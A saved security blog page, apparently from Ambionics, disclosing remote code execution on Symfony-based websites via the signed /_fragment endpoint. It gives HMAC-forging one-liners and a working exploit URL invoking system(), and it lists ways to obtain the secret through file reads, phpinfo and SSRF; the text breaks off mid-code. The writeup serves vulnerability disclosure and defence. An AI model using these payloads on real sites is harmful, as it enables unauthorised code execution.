<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths skrollr skrollr-desktop" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="utf-8"><title>Secret fragments: Remote code execution on Symfony based websites</title><meta content="Remote code execution using Symfony's _fragment's page and unsecure secret values." name="description"><meta content="width=300, initial-scale=1.0, shrink-to-fit=no" name="viewport"><meta content="Ambionics" property="og:site_name"><meta content="Secret fragments: Remote code execution on Symfony based websites" property="og:title"><meta content="website" property="og:type"><meta content="https://www.ambionics.io/blog/symfony-secret-fragment" property="og:url"><meta content="https://www.ambionics.io/images/symfony-secret-fragment/symfony-secret-fragment.png" property="og:image"><meta content="Remote code execution using Symfony's _fragment's page and unsecure secret values." property="og:description"><meta content="en_EN" property="og:locale"><meta content="summary_large_image" name="twitter:card"><meta content="@ambionics" name="twitter:creator"><meta content="@ambionics" name="twitter:site"><meta content="Secret fragments: Remote code execution on Symfony based websites" name="twitter:title"><meta content="https://www.ambionics.io/images/symfony-secret-fragment/symfony-secret-fragment.png" name="twitter:image"><meta content="Remote code execution using Symfony's _fragment's page and unsecure secret values." name="twitter:description"><meta content="https://www.ambionics.io" name="twitter:url"><link href="https://www.ambionics.io/theme/images/favicon.png" rel="icon" type="image/png"><link href="https://www.ambionics.io/feeds/all.atom.xml" rel="alternate" title="Ambionics Security Blog Atom Feed" type="application/atom+xml"><link href="https://www.ambionics.io/feeds/all.rss.xml" rel="alternate" title="Ambionics Security Blog Atom Feed" type="application/rss+xml"><link href="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/style.css" rel="stylesheet"><link href="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/css.css" rel="stylesheet" type="text/css"><link href="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/pygment.css" rel="stylesheet"></head><body class="parallax lang_en" style=""><nav class="white-nav" id="navigation"><div class="navigation first-nav double-nav raleway white-nav"><div class="nav-inner clearfix"><div class="logo f-left"><a class="logo-link scroll" href="https://www.ambionics.io/" title="home"><img alt="Logo" data-second-logo="/theme/images/logo/logo_condensed_dark.png" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/logo_condensed_white.png"></a></div><a class="mobile-nav-button"><i class="fa fa-bars"></i></a><div class="nav-menu clearfix f-right"><ul class="nav uppercase normal oswald big-texts"><li><a class="scroll" href="https://www.ambionics.io/how-it-works" title="How it works">How it works</a></li><li><a class="scroll" href="https://www.ambionics.io/offers" title="Offers">Offers</a></li><li><a class="scroll" href="https://www.ambionics.io/about" title="About">About</a></li><li><a class="scroll" href="https://www.ambionics.io/blog/" title="Blog">Blog</a></li><li><a class="scroll" href="https://www.ambionics.io/contact" title="Contact">Contact</a></li></ul></div></div></div></nav><div class="navigation double-nav raleway white-nav second-nav" style="top: 0px;"><div class="nav-inner clearfix"><div class="logo f-left"><a class="logo-link scroll" href="https://www.ambionics.io/" title="home"><img alt="Logo" data-second-logo="/theme/images/logo/logo_condensed_dark.png" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/logo_condensed_dark.png"></a></div><a class="mobile-nav-button"><i class="fa fa-bars"></i></a><div class="nav-menu clearfix f-right navigation-menu"><ul class="nav uppercase normal oswald big-texts"><li><a class="scroll" href="https://www.ambionics.io/how-it-works" title="How it works">How it works</a></li><li><a class="scroll" href="https://www.ambionics.io/offers" title="Offers">Offers</a></li><li><a class="scroll" href="https://www.ambionics.io/about" title="About">About</a></li><li><a class="scroll" href="https://www.ambionics.io/blog/" title="Blog">Blog</a></li><li><a class="scroll" href="https://www.ambionics.io/contact" title="Contact">Contact</a></li></ul></div></div></div><section class="background50 parallax big-header" id="page-header" style="background-position: 50% -58px;"><div class="page_header_inner clearfix white"><div class="center-details f-center"><h2 class="page_header thin oswald skrollable skrollable-after" data-0="opacity:1;" data-600="opacity:0;" style="opacity: 0;">Secret fragments: Remote code execution on Symfony based websites</h2><h5 class="page_note extra-light"></h5></div></div></section><div class="top-edge"><img alt="Polygonal Background" class="polygonal-bg" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/bkgd-top-edge.png"></div><section class="background1"><div class="inner t-center clearfix"><section class="clearfix boxed pt-40 mb-80" id="blog" style="margin-bottom: 80px; padding-top: 40px;"><div class="col-md-12 pl-00 pr-10 mt-90" style="margin-top: 90px; padding-left: 0px; padding-right: 10px;"><div class="post clearfix"><div class="dates f-left"><h6 class="date"><span class="day colored helvetica">19</span> October, 2020</h6><div class="details"><ul class="t-right fullwidth"><li>Posted By Charles Fol <i class="fa fa-user"></i></li><li>php symfony secret fragment ezplatform ezpublish bolt <i class="fa fa-tag"></i></li></ul></div></div><div class="post-inner f-right t-left" id="article-content"><div class="post-media mp-gallery"><img alt="Full Article" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/symfony-secret-fragment.png"></div><div class="post-text light t-left"><h1 id="introduction">Introduction</h1><p>Since its creation in 2008, the use of the <a href="https://symfony.com/">Symfony</a>
 framework has been growing more and more in PHP based applications. It 
is now a core component of many well known CMSs, such as <a href="https://www.drupal.org/">Drupal</a>, <a href="https://www.joomla.org/">Joomla!</a>, <a href="https://ezplatform.com/">eZPlatform</a> (formerly eZPublish), or <a href="https://bolt.cm/">Bolt</a>, and is often used to build custom websites.</p><p>One of Symfony's built-in features, made to handle <a href="https://en.wikipedia.org/wiki/Edge_Side_Includes">ESI (Edge-Side Includes)</a>, is the <a href="https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php"><code>FragmentListener</code> class</a>. Essentially, when someone issues a request to <code>/_fragment</code>, this listener sets request attributes from given GET parameters. Since this allows to <strong>run arbitrary PHP code</strong> (<em>more on this later</em>),
 the request has to be signed using a HMAC value. This HMAC's secret 
cryptographic key is stored under a Symfony configuration value named <code>secret</code>.</p><p>This configuration value, <code>secret</code>,
 is also used, for instance, to build CSRF tokens and remember-me 
tokens. Given its importance, this value must obviously be very random.</p><p>Unfortunately, we discovered that oftentimes, the secret either has a <strong>default value</strong>, or there exist <strong>ways to obtain the value, bruteforce it offline, or to purely and simply bypass the security check that it is involved with</strong>. It most notably affects Bolt, eZPlatform, and eZPublish.</p><p>Although this may seem like a begnin configuration issue, we have found that default, bruteforceable or guessable values are <strong>very, very often present</strong>
 in the mentioned CMSs as well as in custom applications. This is mainly
 due to not putting enough emphasis on its importance in the 
documentation or installation guides.</p><p>Furthermore, an attacker can escalate less-impactful vulnerabilities to either read the <code>secret</code> (through a file disclosure), bypass the <code>/_fragment</code> signature process (using an SSRF), and even leak it through <code>phpinfo()</code> !</p><p>In
 this blogpost, we'll describe how the secret can be obtained in various
 CMSs and on the base framework, and how to get code execution using 
said secret.</p><h1 id="a-little-bit-of-history">A little bit of history</h1><p>Being a modern framework, Symfony has had to deal with generating sub-parts of a request from its creation to our times. Before <code>/_fragment</code>, there was <code>/_internal</code> and <code>/_proxy</code>, which did essentially the same thing. It produced a lot of vulnerabilities through the years: <a href="https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes">CVE-2012-6432</a>, <a href="https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy">CVE-2014-5245</a>, and <a href="https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access">CVE-2015-4050</a>, for instance.</p><p>Since Symfony 4, the secret is generated on installation, and the <code>/_fragment</code> page is disabled by default. One would think, therefore, that the conjunction of both having a weak <code>secret</code>, and enabled <code>/_fragment</code>,
 would be rare. It is not: many frameworks rely on old Symfony versions 
(even 2.x is very present still), and implement either a static <code>secret</code> value, or generate it poorly. Furthermore, many rely on ESI and as such enable the <code>/_fragment</code>
 page. Also, as we'll see, other lower-impact vulnerabilities can allow 
to dump the secret, even if it has been securely generated.</p><h1 id="executing-code-with-the-help-of-secret">Executing code with the help of <code>secret</code></h1><p>We'll first demonstrate how an attacker, having knowledge of the <code>secret</code> configuration value, can obtain code execution. This is done for the last <code>symfony/http-kernel</code> version, but is similar for other versions.</p><h2 id="using-_fragment-to-run-arbitrary-code">Using <code>/_fragment</code> to run arbitrary code</h2><p>As mentioned before, we will make use of the <code>/_fragment</code> page.</p><div class="highlight"><pre><span></span><span class="c1"># ./vendor/symfony/http-kernel/EventListener/FragmentListener.php</span>

<span class="k">class</span> <span class="nc">FragmentListener</span> <span class="k">implements</span> <span class="nx">EventSubscriberInterface</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">onKernelRequest</span><span class="p">(</span><span class="nx">RequestEvent</span> <span class="nv">$event</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$event</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">();</span>

        <span class="c1"># [1]</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fragmentPath</span> <span class="o">!==</span> <span class="nb">rawurldecode</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPathInfo</span><span class="p">()))</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">attributes</span><span class="o">-&gt;</span><span class="na">has</span><span class="p">(</span><span class="s1">'_controller'</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.</span>
            <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="o">-&gt;</span><span class="na">remove</span><span class="p">(</span><span class="s1">'_path'</span><span class="p">);</span>

            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1"># [2]</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$event</span><span class="o">-&gt;</span><span class="na">isMasterRequest</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">validateRequest</span><span class="p">(</span><span class="nv">$request</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1"># [3]</span>
        <span class="nb">parse_str</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'_path'</span><span class="p">,</span> <span class="s1">''</span><span class="p">),</span> <span class="nv">$attributes</span><span class="p">);</span>
        <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">attributes</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">(</span><span class="nv">$attributes</span><span class="p">);</span>
        <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">attributes</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">'_route_params'</span><span class="p">,</span> <span class="nb">array_replace</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">attributes</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'_route_params'</span><span class="p">,</span> <span class="p">[]),</span> <span class="nv">$attributes</span><span class="p">));</span>
        <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="o">-&gt;</span><span class="na">remove</span><span class="p">(</span><span class="s1">'_path'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div><p><code>FragmentListener:onKernelRequest</code> will be run on every request: if the request's path is <code>/_fragment</code> [1], the method will first check that the request is valid (<em>i.e.</em> properly signed), and raise an exception otherwise [2]. If the security checks succeed, it will parse the url-encoded <code>_path</code> parameter, and set <code>$request</code> attributes accordingly.</p><p>Request
 attributes are not to be mixed up with HTTP request parameters: they 
are internal values, maintained by Symfony, that usually cannot be 
specified by a user. One of these request attributes is <code>_controller</code>, which specifies which Symfony controller (a <em>(class, method)</em> tuple, or simply a <em>function</em>) is to be called. Attributes whose name does not start with <code>_</code> are arguments that are going to be fed to the controller. For instance, if we wished to call this method:</p><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">SomeClass</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">someMethod</span><span class="p">(</span><span class="nv">$firstMethodParam</span><span class="p">,</span> <span class="nv">$secondMethodParam</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="o">...</span>
    <span class="p">}</span> 
<span class="p">}</span>
</pre></div><p>We'd set <code>_path</code> to:</p><p><code>_controller=SomeClass::someMethod&amp;firstMethodParam=test1&amp;secondMethodParam=test2</code></p><p>The request would then look like this:</p><p><code>http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&amp;_hash=...</code></p><p>Essentially,
 this allows to call any function, or any method of any class, with any 
parameter. Given the plethora of classes that Symfony has, <strong>getting code execution is trivial</strong>. We can, for instance, call <code>system()</code>:</p><p><code>http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&amp;_hash=...</code></p><p><em>Calling system won't work every time: refer to the Exploit section for greater details about exploitation subtilities.</em></p><p>One problem remains: how does Symfony verify the signature of the request?</p><h2 id="signing-the-url">Signing the URL</h2><p>To verify the signature of an URL, an HMAC is computed against the <em>full</em> URL. The obtained hash is then compared to the one specified by the user.</p><p>Codewise, this is done in two spots:</p><div class="highlight"><pre><span></span><span class="c1"># ./vendor/symfony/http-kernel/EventListener/FragmentListener.php</span>

<span class="k">class</span> <span class="nc">FragmentListener</span> <span class="k">implements</span> <span class="nx">EventSubscriberInterface</span>
<span class="p">{</span>
    <span class="k">protected</span> <span class="k">function</span> <span class="nf">validateRequest</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// is the Request safe?</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">isMethodSafe</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">AccessDeniedHttpException</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="c1">// is the Request signed?</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">signer</span><span class="o">-&gt;</span><span class="na">checkRequest</span><span class="p">(</span><span class="nv">$request</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1"># [3]</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">AccessDeniedHttpException</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># ./vendor/symfony/http-kernel/UriSigner.php</span>

<span class="k">class</span> <span class="nc">UriSigner</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">checkRequest</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span><span class="o">:</span> <span class="nx">bool</span>
    <span class="p">{</span>
        <span class="nv">$qs</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$qs</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'QUERY_STRING'</span><span class="p">))</span> <span class="o">?</span> <span class="s1">'?'</span><span class="o">.</span><span class="nv">$qs</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>

        <span class="c1">// we cannot use $request-&gt;getUri() here as we want to work with the original URI (no query string reordering)</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getSchemeAndHttpHost</span><span class="p">()</span><span class="o">.</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getBaseUrl</span><span class="p">()</span><span class="o">.</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getPathInfo</span><span class="p">()</span><span class="o">.</span><span class="nv">$qs</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="sd">/**</span>
<span class="sd">     * Checks that a URI contains the correct hash.</span>
<span class="sd">     *</span>
<span class="sd">     * @return bool True if the URI is signed correctly, false otherwise</span>
<span class="sd">     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$uri</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$url</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$uri</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nb">parse_str</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'query'</span><span class="p">],</span> <span class="nv">$params</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$params</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameter</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$hash</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameter</span><span class="p">];</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameter</span><span class="p">]);</span>

        <span class="c1"># [2]</span>
        <span class="k">return</span> <span class="nx">hash_equals</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">computeHash</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildUrl</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)),</span> <span class="nv">$hash</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">computeHash</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$uri</span><span class="p">)</span><span class="o">:</span> <span class="nx">string</span>
    <span class="p">{</span>
        <span class="c1"># [1]</span>
        <span class="k">return</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$uri</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span><span class="p">,</span> <span class="k">true</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">buildUrl</span><span class="p">(</span><span class="k">array</span> <span class="nv">$url</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$params</span> <span class="o">=</span> <span class="p">[])</span><span class="o">:</span> <span class="nx">string</span>
    <span class="p">{</span>
        <span class="nb">ksort</span><span class="p">(</span><span class="nv">$params</span><span class="p">,</span> <span class="nx">SORT_STRING</span><span class="p">);</span>
        <span class="nv">$url</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$params</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="s1">'&amp;'</span><span class="p">);</span>

        <span class="nv">$scheme</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'scheme'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$url</span><span class="p">[</span><span class="s1">'scheme'</span><span class="p">]</span><span class="o">.</span><span class="s1">'://'</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$host</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'host'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$url</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$port</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'port'</span><span class="p">])</span> <span class="o">?</span> <span class="s1">':'</span><span class="o">.</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'port'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'user'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$url</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">])</span> <span class="o">?</span> <span class="s1">':'</span><span class="o">.</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$pass</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">||</span> <span class="nv">$pass</span><span class="p">)</span> <span class="o">?</span> <span class="s2">"</span><span class="si">$pass</span><span class="s2">@"</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$path</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'path'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$url</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$query</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'query'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$url</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span> <span class="o">?</span> <span class="s1">'?'</span><span class="o">.</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$fragment</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'fragment'</span><span class="p">])</span> <span class="o">?</span> <span class="s1">'#'</span><span class="o">.</span><span class="nv">$url</span><span class="p">[</span><span class="s1">'fragment'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>

        <span class="k">return</span> <span class="nv">$scheme</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="nv">$port</span><span class="o">.</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$query</span><span class="o">.</span><span class="nv">$fragment</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div><p>In short, Symfony extracts the <code>_hash</code> GET parameter, then reconstructs the full URL, for instance <code>https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...</code>, computes an HMAC from this URL using the <code>secret</code> as key [1], and compares it to the given hash value [2]. If they don't match, a <code>AccessDeniedHttpException</code> exception is raised [3], resulting in a <code>403</code> error.</p><h2 id="example">Example</h2><p>To test this, let's setup a test environment, and extract the secret (in this case, randomly generated).</p><div class="highlight"><pre><span></span>$ git clone https://github.com/symfony/skeleton.git
$ <span class="nb">cd</span> skeleton
$ composer install
$ sed -i -E <span class="s1">'s/#(esi|fragment)/\1/g'</span> config/packages/framework.yaml <span class="c1"># Enable ESI/fragment</span>
$ grep -F APP_SECRET .env <span class="c1"># Find secret</span>
<span class="nv">APP_SECRET</span><span class="o">=</span>50c8215b436ebfcc1d568effb624a40e
$ <span class="nb">cd</span> public
$ php -S 0:8000
</pre></div><p>Now, visiting <code>http://localhost:8000/_fragment</code> yields a <code>403</code>. Let's now try and provide a valid signature:</p><div class="highlight"><pre><span></span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"import base64, hmac, hashlib; print(base64.b64encode(hmac.HMAC(b'50c8215b436ebfcc1d568effb624a40e', b'http://localhost:8000/_fragment', hashlib.sha256).digest()))"</span>
<span class="n">b</span><span class="s1">'lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm/cmFOh8='</span>
</pre></div><p>By checking out <code>http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm/cmFOh8=</code>, we now have a <code>404</code> status code. The signature was correct, but we did not specify any request attribute, so Symfony does not find our controller.</p><p>Since we can call any method, with any argument, we can for instance pick <code>system($command, $return_value)</code>, and provide a payload like so:</p><div class="highlight"><pre><span></span>$ <span class="nv">page</span><span class="o">=</span><span class="s2">"http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"</span>
$ python -c <span class="s2">"import base64, hmac, hashlib; print(base64.b64encode(hmac.HMAC(b'50c8215b436ebfcc1d568effb624a40e', b'</span><span class="nv">$page</span><span class="s2">', hashlib.sha256).digest()))"</span>
b<span class="s1">'GFhQ4Hr1LIA8mO1M/qSfwQaSM8xQj35vPhyrF3hvQyI='</span>
</pre></div><p>We can now visit the exploit URL: <code>http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&amp;_hash=GFhQ4Hr1LIA8mO1M/qSfwQaSM8xQj35vPhyrF3hvQyI=</code>.</p><p>Despite the <code>500</code> error, we can see that <strong>our command got executed</strong>.</p><p><img alt="1" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/1.png"><em>RCE using fragment</em></p><h1 id="finding-secrets">Finding secrets</h1><p>Again:
 all of this would not matter if secrets were not obtainable. 
Oftentimes, they are. We'll describe several ways of getting code 
execution without any prior knowledge.</p><h2 id="through-vulnerabilities">Through vulnerabilities</h2><p>Let's start with the obvious: using lower-impact vulnerabilities to obtain the secret.</p><h3 id="file-read">File read</h3><p>Evidently, a file read vulnerability could be used to read the following files, and obtain <code>secret</code>:</p><ul><li><code>app/config/parameters.yml</code></li><li><code>.env</code></li></ul><p><em>As an example, some Symfony debug toolbars allow you to read files.</em></p><h3 id="phpinfo">PHPinfo</h3><p>On recent symfony versions (3.x), <code>secret</code> is stored in <code>.env</code> as <code>APP_SECRET</code>. Since it is then imported as an environment variable, they can be seen through a <code>phpinfo()</code> page.</p><p><img alt="2" src="Secret%20fragments%20Remote%20code%20execution%20on%20Symfony%20based%20websites_fichiers/2.png"><em>Leaking APP_SECRET through phpinfo</em></p><p>This can most notably be done through Symfony's profiler package, as demonstrated by the screenshot.</p><h3 id="ssrf-ip-spoofing-cve-2014-5245">SSRF / IP spoofing (CVE-2014-5245)</h3><p>The code behind <code>FragmentListener</code> has evolved through the years: up to version <em>2.5.3</em>, when the request came from a trusted proxy (read: <code>localhost</code>),
 it would be considered safe, and as such the hash would not be checked.
 An SSRF, for instance, can allow to immediately run code, regardless of
 having <code>secret</code> or not. This notably affects eZPublish up to 2014.7.</p><div class="highlight"><pre><span></span><span class="c1"># ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php</span>
<span class="c1"># Symfony 2.3.18</span>

<span class="k">class</span> <span class="nc">FragmentListener</span> <span class="k">implements</span> <span class="nx">EventSubscriberInterface</span>
<span class="p">{</span>
    <span class="k">protected</span> <span class="k">function</span> <span class="nf">validateRequest</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// is the Request safe?</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">isMethodSafe</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">AccessDeniedHttpException</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="c1">// does the Request come from a trusted IP?</span>
        <span class="nv">$trustedIps</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getLocalIpAddresses</span><span class="p">(),</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">getTrustedProxies</span><span class="p">());</span>
        <span class="nv">$remoteAddress</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'REMOTE_ADDR'</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">IpUtils</span><span class="o">::</span><span class="na">checkIp</span><span class="p">(</span><span class="nv">$remoteAddress</span><span class="p">,</span> <span class="nv">$trustedIps</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

